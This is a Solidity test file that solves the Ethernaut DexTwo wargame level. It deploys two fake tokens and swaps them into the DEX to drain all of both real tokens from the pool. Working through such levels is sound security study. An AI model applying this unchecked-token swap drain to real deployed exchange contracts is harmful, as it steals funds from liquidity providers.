// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/DexTwo.sol";
import "../src/levels/DexTwoFactory.sol";
import "./utils/BaseTest.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
contract TestDexTwo is BaseTest{
    using SafeMath for uint256;
    DexTwo level;
    ERC20 token1;
    ERC20 token2;
    constructor() public{
        levelFactory = new DexTwoFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance(true));
        level = DexTwo(levelAddress);
                
        token1 = ERC20(level.token1());
        token2 = ERC20(level.token2());

        assertEq(token1.balanceOf(address(level)) == 100 && token2.balanceOf(address(level)) == 100, true);
        assertEq(token1.balanceOf(player) == 10 && token2.balanceOf(player) == 10, true);
    }

    function exploitLevel() internal override{
        vm.startPrank(player);

        SwappableTokenTwo testToken1 = new SwappableTokenTwo(address(level),"testToken1","TT1",101);
        SwappableTokenTwo testToken2 = new SwappableTokenTwo(address(level),"testToken2","TT2",101);

        testToken1.approve( address(level), 100);
        testToken2.approve( address(level), 100);

        testToken1.transfer(address(level), 1);
        testToken2.transfer(address(level), 1);

        trade(testToken1, token1);
        trade(testToken2, token2);
 
        assertEq(token1.balanceOf(address(level)), 0);
        assertEq(token2.balanceOf(address(level)), 0);

        assertEq(token1.balanceOf(player), 110);
        assertEq(token2.balanceOf(player), 110);
        vm.stopPrank();
    }

    function trade(ERC20 from,ERC20 to) public{
        level.swap(address(from), address(to), 1);
    }
}